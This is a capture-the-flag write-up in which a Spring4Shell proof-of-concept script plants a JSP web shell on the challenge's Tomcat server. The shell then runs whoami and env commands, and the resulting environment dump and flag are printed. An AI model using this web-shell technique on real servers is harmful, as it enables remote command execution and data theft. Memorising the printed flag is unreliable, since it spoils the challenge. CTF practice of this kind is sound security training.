# Helicarrier Breach

## Description

S.H.I.E.L.D.'s Helicarrier Personnel Registry is still running an aging internal platform on the carrier network. HYDRA believes the registry is exposing more than it should. Find a way in and recover the Director's sealed dossier.

## Solution Walkthrough

This challenge is Spring4Shell. You can refer to the script in [this repo](https://github.com/BobTheShoplifter/Spring4Shell-POC/). The execution method is as follows:

```text
❯ python .\solution.py --url https://world-9d1fe95b45314c1d89d71c9147-xtur3.ondigitalocean.app/search --file bbb
Vulnerable，shell url: https://world-9d1fe95b45314c1d89d71c9147-xtur3.ondigitalocean.app/tomcatwar.jsp?pwd=j&cmd=whoami
```

After entering, use `/tomcatwar.jsp?pwd=j&cmd=env` to obtain the flag.

```text
KUBERNETES_SERVICE_PORT_HTTPS= KUBERNETES_SERVICE_PORT= HOSTNAME=web-688f6d4dd6-j84f6 LANGUAGE=en_US:en JAVA_HOME=/opt/java/openjdk GPG_KEYS=48F8E69F6390C9F25CFEDCD268248959359E722B A9C5DF4D22E99998D9875A5110C01C5A2F6059E7 DCFD35E0BF8CA7344752DE8B6FB21E8933C60243 PWD=/usr/local/tomcat PORT=8080 TOMCAT_SHA512=a4d43ac45f76e29d3dea23a2712c7570a11419aad7a1af2d1533454709c020b59666c7f9e063a77120224e0cbd4020cac06ca596dda7057cacb9a8a7e6d73eea TOMCAT_MAJOR=9 HOME=/root LANG=en_US.UTF-8 KUBERNETES_PORT_443_TCP= TOMCAT_NATIVE_LIBDIR=/usr/local/tomcat/native-jni-lib FLAG=bitctf{{sp4_sh3ll_h3l1carr13r_0wn3d}} CATALINA_HOME=/usr/local/tomcat SHLVL=0 KUBERNETES_PORT_443_TCP_PROTO= JDK_JAVA_OPTIONS= --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED --add-opens=java.base/java.util.concurrent=ALL-UNNAMED --add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED KUBERNETES_PORT_443_TCP_ADDR= LD_LIBRARY_PATH=/usr/local/tomcat/native-jni-lib KUBERNETES_SERVICE_HOST= LC_ALL=en_US.UTF-8 KUBERNETES_PORT= KUBERNETES_PORT_443_TCP_PORT= PATH=/usr/local/tomcat/bin:/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TOMCAT_VERSION=9.0.60 JAVA_VERSION=jdk-17.0.2+8
```

## Flag

```text
bitctf{{sp4_sh3ll_h3l1carr13r_0wn3d}}
```
